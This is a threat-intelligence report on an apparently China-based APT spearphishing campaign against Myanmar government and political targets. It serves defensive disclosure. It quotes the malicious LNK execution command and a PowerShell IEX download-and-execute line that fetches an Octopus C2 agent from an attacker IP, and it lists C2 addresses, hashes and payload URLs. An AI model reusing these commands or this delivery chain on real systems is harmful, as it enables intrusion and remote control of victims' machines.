An unidentified Advanced Persistent Threat (APT), very likely China-based, is\ndistributing Windows Shortcut (LNK) files that are being renamed and distributed to multiple targets,\nlikely via spearphishing. Anomali Threat Research found these LNK files located inside multiple,\nuniquely-named RAR, TGZ, and ZIP files. The RAR and ZIP files are hosted on Google Drive, this is\nvery likely a tactic to avoid antivirus detection. The group uses the PowerShell-based, Red Teaming\ntool Octopus for Command and Control (C2) communication.\n\nIn addition, Anomali Threat Research found that the LNK file closely resembles the one used by the\nChina-based APT, [Mustang Panda. Anomali Threat Research does not believe that this group is](https://www.anomali.com/blog/china-based-apt-mustang-panda-targets-minority-groups-public-and-private-sector-organizations)\nresponsible for this activity. This similarity may potentially indicate a sharing of tools, which is common\namongst some state-sponsored groups, or perhaps a similar tool that is used to target specific\ngeographic regions. At the time of this writing, Anomali Threat Research cannot attribute this APT\nactivity to any specific group. The renamed LNK files are shown in Table 1 below.\n\n## Targeting\n\nChina-sponsored APT groups are known to target countries in which the government of the People’s\nRepublic of China is investing in, as part of its Belt and Road Initiative. This has also been observed\nby Anomali Threat Research analysis of the China-based APT, Mustang Panda. China and Myanmar\n(Burma) have had multiple instances of economic activity and agreements in 2020, as of this writing,\nand the two countries share a complex history that often resulted in conflict.[1] In January 2020,\nPresident Xi Jinping visited Myanmar and State Counselor Aung San Suu signed 33 agreements\nconcerning projects as part of the Belt and Road Initiative.[2] China is also one of the largest investors\nin Myanmar, accounting for a quarter of all Myanmar’s investment, and is Myanmar’s largest export\npartner.[3] Anomali Threat Research believes that because of these economic factors, in addition, to\nfile names and compilation times, similar malicious functionality to previously-attributed China-based\ngroups and geographic location of potential targets, that this activity very likely originates from a\nChina-based source.\n\n\n### Potentially-Targeted Entities\n\nThese possible targets are based specifically on file names identified by Anomali Threat Research.\n\nMyanmar Police Force (MPF)\nNational Crisis Management Center (NCMC)\nNational League for Democracy (NLD)\nOffice of Chief of Military Security Affairs (OCMSA)\n\nThe economic activity between China and Myanmar that is of particular interest to Anomali Threat\nResearch is the Myanmar Yatai International Holding Group’s, a subsidiary of China’s Yatai Group,\ninvestment into the development of 25.5 acres in Kayin State, Myanmar.[4] There are dubious details\n\n\n-----\n\nconcerning the urban development in the acreage near the Thailand border, which was approved by\nthe Myanmar Investment Commission, and discussed by a director of Myanmar’s Directorate of\nInvestment Company Administration (DICA); who confirmed the land was for 59 villas in three years.\nIn early-March 2020, the Myanmar Yatai International Holding Group claimed that the first phase of\ndevelopment covered 214 acres, instead of the 25.5 acres approved by the government in an area\ncontrolled by Kayin State.[6] The claim in March 2020 may be a potential catalyst, or purposefully\nalignment, for this campaign.\n\n_Table 1 - Renamed LNKs Located inside RAR or ZIP_\n\n**File Name** **MD5**\n\nocmsa[2020]report.rar 916b26f22658ce252531bb4ea43ef4cf\n\nHtoo 2 army research (Mpf 29-03-2020).zip 75b72340d6988ac262cabf923e548952\n\nocmsa Htoo 2 army research (Mpf 29-03-2020).rar 1f89a9d077a9712e6d227ef3cb1faac9\n\nocmsa[30-03-2020].zip 9e1f7e35fb3ae292f478d346d076c274\n\n## Technical Analysis\n\n\n\n[5]\n\n|File Name|MD5|\n|---|---|\n|ocmsa[2020]report.rar|916b26f22658ce252531bb4ea43ef4cf|\n|Htoo 2 army research (Mpf 29-03-2020).zip|75b72340d6988ac262cabf923e548952|\n|ocmsa Htoo 2 army research (Mpf 29-03-2020).rar|1f89a9d077a9712e6d227ef3cb1faac9|\n|ocmsa[30-03-2020].zip|9e1f7e35fb3ae292f478d346d076c274|\n\n\nThreat actors very likely distributing spearphishing emails with links to download an attachment from\nGoogle Drive. Utilizing Google Drive is a known tactic used by actors to evade antivirus and security\nscanners from identifying the malicious files. Once a user navigates to the Drive URL that a ZIP or\nRAR file that contains a weaponized Windows Shortcut file will be downloaded on the target host. The\nLNK file utilized in the campaign contains an embedded HTA file with VBscript that, once executed,\nwill drop and run an executable in the background and communicates with the Command and Control\n(C2).\n\n### LNK File Analysis\n\nOnce the user opens the LNK file, the below command gets executed. The command looks for a file\nthat contains *2020*.LNK and proceeds to execute via mshta.exe.\n\n**LNK metadata**\n\nMachine ID: win-luu9i5otui2\n\nMAC Address: 00:0c:29:5a:a6:25\n\nMAC Vendor: VMWARE\n\nCreation: 2019-08-05 01:31:57\n\n### Command\n```\n/c for %x in (%temp%=%cd%) do for /f \"delims==\" %i in ('dir /s /b \"%x *2020*.LNK\"') do start\n%TEMP:~-2,1%shta \"%i\"\n\n```\nAfter the command execution, it writes an executable named f.exe in the “C:userspublic.exe”\ndirectory. The file f.exe is then executed using Windows Management Instrumentation (WMI) in a\nhidden window via WMI Tasks.\n\n\n-----\n\n_Figure 2 - Screenshot of the LNK file_\n\n\n-----\n\nIt is worth noting that the LNK file with an embedded HTA file is very similar to Mustang Panda s initial\ndropper, however, Anomali Threat Research could not attribute this activity to the group.\n\nThe executable f.exe uses the Living off the Land (LOLbin) technique to launch cmd.exe via the\n**ShellExec_RunDLL function. The below command uses Powershell to download and execute the**\nsecond stage payload from the C2 server.\n```\n\"C:WindowsSystem32\nundll32.exe\" SHELL32.DLL,ShellExec_RunDLL \"cmd.exe\" \"/c powershell IEX (New-Object\nNet.WebClient).DownloadString('http://193.29.59.130/index');\"\n\n```\nThe downloaded file index is a PowerShell script that was found to be a publicly available Octopus\n**C2 framework agent as shown in Figure 3.[7]**\n\n_Figure 3 - Octopus C2 agent comparison_\n\nThe Octopus agent fingerprints the host and sends the collected information back to C2 as part of the\nencrypted HTTP header as shown in Figure 4. The Octopus agent can be used to download further\npayloads or perform additional activity onto the infected host.\n\n_Figure 4 - Snippet of the Octopus agent code_\n\n### Network Pivoting for Additional Samples\n\n**193.29.59[.]130**\n\nUsing the IP address 193.29.59[.]130 as a pivot point Anomali Threat Research was able to find a\nnew sample named D0CX_OCMSA Russia Army Weppon Ferrence to Thailand Archive.exe from\nHybrid-analysis.com as shown in Figure 5.\n\n\n-----\n\n_Figure 5 - Screenshot of Newly Identified Sample_\n\nThe sample communicates to two C2 IP addresses as shown in Figure 6.\n\n23.106.122.234\n193.29.59.130\n\n_Figure 6 - Newly Observed C2 IP Address_\n\n**23.106.122.234**\n\nUpon pivoting using the IP address 23.106.122.234, Anomali Threat Research was able to identify the\nPowerShell-based Octopus agent from the C2 server as shown in Figure 7 below.\n\n_Figure 7 - Newly Identified Samples Communicating to 23.106.122.234_\n\n### Pivoting via Compilation Timestamp\n\n\n-----\n\nIn order to find more samples from the campaign, Anomali Threat Research used the compilation\ntimestamp from one of the identified samples 6a1611c1bd34fa3878617ef2905b1d87 which was\ncompiled on\n\n**2020-03-10 07:54:26 and shown in Table 2 below.**\n\n_Table 2 -_\n\n**Compilation**\n\n**File Name** **MD5** **Timestamp**\n\nNo file name observed 4cf56653f28ccd03a78213f0b4cb0075 2020-03-10\n07:54:26\n\nList Of Maf President Commander in fd82b2a1b6479de8e1949c72401c1328 2020-03-10\nChief with NLD Election.Exe 07:54:26\n\norder545.exe a086fae1cd2a1074ee489535169f1b79 2020-03-10\n07:54:26\n\n## Conclusion\n\nThe malicious activity identified by Anomali Threat Research appears to align with techniques that\nwould be used by a China-based group. Following the Belt and Road Initiative can often result in\nidentifying malicious activity that coincides with China-based groups’ Tactics, Techniques, and\nProcedures (TTPs). The specificity in file names associated with Myanmarese entities, similar LNK\nfunctionality to known China-sponsored APTs, as well as economic and geographical factors, lead\nAnomali Threat Research to believe that China-based APT is responsible for this campaign.\n\n## IOCs\n\n|File Name|MD5|Compilation Timestamp|\n|---|---|---|\n|No file name observed|4cf56653f28ccd03a78213f0b4cb0075|2020-03-10 07:54:26|\n|List Of Maf President Commander in Chief with NLD Election.Exe|fd82b2a1b6479de8e1949c72401c1328|2020-03-10 07:54:26|\n|order545.exe|a086fae1cd2a1074ee489535169f1b79|2020-03-10 07:54:26|\n\n|File Name|Hash|\n|---|---|\n|ocmsa[2020]report.rar|916b26f22658ce252531bb4ea43ef4cf|\n|ocmsa[30-03- 2020].zip|9e1f7e35fb3ae292f478d346d076c274|\n|ocmsa Htoo 2 army research (Mpf 29-03- 2020).rar|1f89a9d077a9712e6d227ef3cb1faac9|\n|Htoo 2 army research (Mpf 29-03-2020).zip|75b72340d6988ac262cabf923e548952|\n|MSAU UPR Facts.Tgz|c94135f94ced83e1bb4c4ebf16d66b30|\n|ocmsa(30-03- 2020).lnk|721a7ddd34d801a883bfc8a1e6349a21|\n\n\n-----\n\n|Htoo 2 army research (Mpf 29-03- 2020).lnk.lnk|721a7ddd34d801a883bfc8a1e6349a21|\n|---|---|\n|f.exe|4754dfaf0a10710c061767acc3adf0e3|\n|order545.exe|a086fae1cd2a1074ee489535169f1b79|\n|D0CX_OCMSA Russia Army Weppon Ferrence to Thailand Archive.exe|f8760362de259d8ce4c31c2e9ce1e1392e5eae8262224a517d3accc0ccb9f8d8|\n|List Of Maf President Commander in Chief with NLD Election.Exe|fd82b2a1b6479de8e1949c72401c1328|\n|Script.php|1a3683b051356a0d4fef2f8a33cd088c|\n|23.106.122.234|C2|\n|193.29.59.130|C2|\n\n\nThe RAR and ZIP files are downloaded from google drive.\n\n**File Name** **Download URL**\n\nocmsa[2020]report.rar https://drive.google.com/u/0/uc?\nid=1WWpgJMZce_yeQd2q5i1z1vUu7_d1rulX&export=download\n\nocmsa Htoo 2 army research https://drive.google.com/u/0/uc?\n(Mpf 29-03-2020).rar id=1WWpgJMZce_yeQd2q5i1z1vUu7_d1rulX&export=download\n\n## Endnotes\n\n[1] Thu Thu Aung and Poppy McPherson, “Myanmar, China ink deals to accelerate Belt and Road as\n\nXi courts and isolated Suu Kyi,” Reuters, accessed June 18, 2020, published January 18, 2020,\nhttps://www.reuters.com/article/us-myanmar-china/myanmar-china-ink-deals-to-accelerate-belt-androad-as-xi-courts-an-isolated-suu-kyi-idUSKBN1ZH054; Marvin C.
